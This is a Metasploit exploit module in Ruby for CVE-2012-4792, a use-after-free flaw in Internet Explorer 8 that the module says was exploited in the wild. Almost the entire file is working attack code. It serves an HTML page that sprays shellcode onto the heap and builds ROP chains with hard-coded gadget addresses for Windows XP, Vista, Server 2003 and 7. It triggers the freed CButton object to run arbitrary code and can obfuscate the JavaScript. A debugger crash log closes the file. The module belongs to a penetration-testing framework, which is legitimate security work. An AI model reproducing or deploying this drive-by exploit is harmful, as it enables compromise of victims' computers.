# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Internet Explorer CDwnBindInfo Object Use-After-Free Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Microsoft Internet Explorer. A
        use-after-free condition occurs when a CButton object is freed, but a reference
        is kept and used again during a page reload, an invalid memory that&#039;s controllable
        is used, and allows arbitrary code execution under the context of the user.

          Please note: This vulnerability has been exploited in the wild targeting
        mainly China/Taiwan/and US-based computers.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;eromang&#039;,
          &#039;mahmud ab rahman&#039;,
          &#039;juan vazquez&#039;,
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-4792&#039; ],
          [ &#039;US-CERT-VU&#039;, &#039;154201&#039; ],
          [ &#039;BID&#039;, &#039;57070&#039; ],
          [ &#039;URL&#039;, &#039;http://blog.fireeye.com/research/2012/12/council-foreign-relations-water-hole-attack-details.html&#039;],
          [ &#039;URL&#039;, &#039;http://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/&#039;],
          [ &#039;URL&#039;, &#039;http://blog.vulnhunt.com/index.php/2012/12/29/new-ie-0day-coming-mshtmlcdwnbindinfo-object-use-after-free-vulnerability/&#039; ],
          [ &#039;URL&#039;, &#039;http://technet.microsoft.com/en-us/security/advisory/2794220&#039; ],
          [ &#039;URL&#039;, &#039;http://blogs.technet.com/b/srd/archive/2012/12/29/new-vulnerability-affecting-internet-explorer-8-users.aspx&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;        => 980,
          &#039;DisableNops&#039; => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 8 on Windows XP SP3&#039;,       { &#039;Rop&#039; => :msvcrt, &#039;Offset&#039; => &#039;0x586&#039; } ], # 0x0c0c0b30
          [ &#039;IE 8 on Windows Vista&#039;,        { &#039;Rop&#039; => :jre,    &#039;Offset&#039; => &#039;0x586&#039; } ], # 0x0c0c0b30
          [ &#039;IE 8 on Windows Server 2003&#039;,  { &#039;Rop&#039; => :msvcrt, &#039;Offset&#039; => &#039;0x586&#039; } ], # 0x0c0c0b30
          [ &#039;IE 8 on Windows 7&#039;,            { &#039;Rop&#039; => :jre,    &#039;Offset&#039; => &#039;0x586&#039; } ]  # 0x0c0c0b30
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Dec 27 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    when &#039;5.2&#039;
      os_name = &#039;Windows Server 2003&#039;
    when &#039;6.0&#039;
      os_name = &#039;Windows Vista&#039;
    when &#039;6.1&#039;
      os_name = &#039;Windows 7&#039;
    else
      # OS not supported
      return nil
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4), Rex::Arch.endian(target.arch))

    # Land the payload at 0x0c0c0b30
    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");
    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);
    heap_obj.gc();
    for (var i=1; i < 0x300; i++) {
      heap_obj.alloc(block);
    }
    |

    js = heaplib(js, {:noobfu => true})

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t[&#039;Rop&#039;].nil?

=begin
Stack Pivoting to eax:
0:008> db eax
0c0c0b30  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
0c0c0b40  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
=end
    # Both ROP chains generated by mona.py - See corelan.be
    case t[&#039;Rop&#039;]
    when :msvcrt
      print_status("Using msvcrt ROP")
      if t.name =~ /Windows XP/
        stack_pivot = [0x77c15ed6].pack("V") * 54 # ret
        stack_pivot << [0x77c2362c].pack("V") # pop ebx, #ret
        stack_pivot << [0x77c15ed5].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
        rop_payload = generate_rop_payload(&#039;msvcrt&#039;, code, {&#039;pivot&#039;=>stack_pivot, &#039;target&#039;=>&#039;xp&#039;})
      else
        stack_pivot = [0x77bcba5f].pack("V") * 54 # ret
        stack_pivot << [0x77bb4158].pack("V") # pop ebx, #ret
        stack_pivot << [0x77bcba5e].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
        rop_payload = generate_rop_payload(&#039;msvcrt&#039;, code, {&#039;pivot&#039;=>stack_pivot, &#039;target&#039;=>&#039;2003&#039;})
      end
    else
      print_status("Using JRE ROP")
      stack_pivot = [0x7c348b06].pack("V") * 54 # ret
      stack_pivot << [0x7c341748].pack("V") # pop ebx, #ret
      stack_pivot << [0x7c348b05].pack("V") # xchg eax,esp # ret # 0x0c0c0c0c
      rop_payload = generate_rop_payload(&#039;java&#039;, code, {&#039;pivot&#039;=>stack_pivot})
    end

    return rop_payload
  end

  def load_exploit_html(my_target, cli)

    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)

    html = %Q|
    <!doctype html>
    <html>
    <head>
    <script>
    #{js}

    function exploit()
    {
      var e0 = null;
      var e1 = null;
      var e2 = null;
      var arrObject = new Array(3000);
      var elmObject = new Array(500);
      for (var i = 0; i < arrObject.length; i++)
      {
        arrObject[i] = document.createElement(&#039;div&#039;);
        arrObject[i].className = unescape("ababababababababababababababababababababa");
      }

      for (var i = 0; i < arrObject.length; i += 2)
      {
        arrObject[i].className = null;
      }

      CollectGarbage();

      for (var i = 0; i < elmObject.length; i ++)
      {
        elmObject[i] = document.createElement(&#039;button&#039;);
      }

      for (var i = 1; i < arrObject.length; i += 2)
      {
        arrObject[i].className = null;
      }

      CollectGarbage();

      try {
        e0 = document.getElementById("a");
        e1 = document.getElementById("b");
        e2 = document.createElement("q");
        e1.applyElement(e2);
        e1.appendChild(document.createElement(&#039;button&#039;));
        e1.applyElement(e0);
        e2.outerText = "";
        e2.appendChild(document.createElement(&#039;body&#039;));
      } catch(e) { }
      CollectGarbage();
      for(var i =0; i < 20; i++)
      {
        arrObject[i].className = unescape("ababababababababababababababababababababa");
      }
      var eip = window;
      var data = "#{Rex::Text.rand_text_alpha(41)}";
      eip.location = unescape("%u0b30%u0c0c" + data);

    }

    </script>
    </head>
    <body onload="eval(exploit())">
    <form id="a">
    </form>
    <dfn id="b">
    </dfn>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, &#039;&#039;)
    print_status("Sending HTML...")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end

end


=begin
(87c.f40): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=12120d0c ebx=0023c218 ecx=00000052 edx=00000000 esi=00000000 edi=0301e400
eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
mshtml!CMarkup::OnLoadStatusDone+0x504:
637848c3 ff90dc000000    call    dword ptr <Unloaded_Ed20.dll>+0xdb (000000dc)[eax] ds:0023:12120de8=????????
0:008> k
ChildEBP RetAddr
020bf8a4 635c378b mshtml!CMarkup::OnLoadStatusDone+0x504
020bf8c4 635c3e16 mshtml!CMarkup::OnLoadStatus+0x47
020bfd10 636553f8 mshtml!CProgSink::DoUpdate+0x52f
020bfd24 6364de62 mshtml!CProgSink::OnMethodCall+0x12
020bfd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb
020bfd78 7e418734 mshtml!GlobalWndProc+0x183
020bfda4 7e418816 USER32!InternalCallWinProc+0x28
020bfe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150
020bfe6c 7e418a10 USER32!DispatchMessageWorker+0x306
020bfe7c 01252ec9 USER32!DispatchMessageW+0xf
020bfeec 011f48bf IEFRAME!CTabWindow::_TabWindowThreadProc+0x461
020bffa4 5de05a60 IEFRAME!LCIETab_ThreadProc+0x2c1
020bffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab
020bffec 00000000 kernel32!BaseThreadStart+0x37

0:008> r
eax=0c0c0c0c ebx=0023c1d0 ecx=00000052 edx=00000000 esi=00000000 edi=033e9120
eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CMarkup::OnLoadStatusDone+0x504:
637848c3 ff90dc000000    call    dword ptr [eax+0DCh] ds:0023:0c0c0ce8=????????

=end

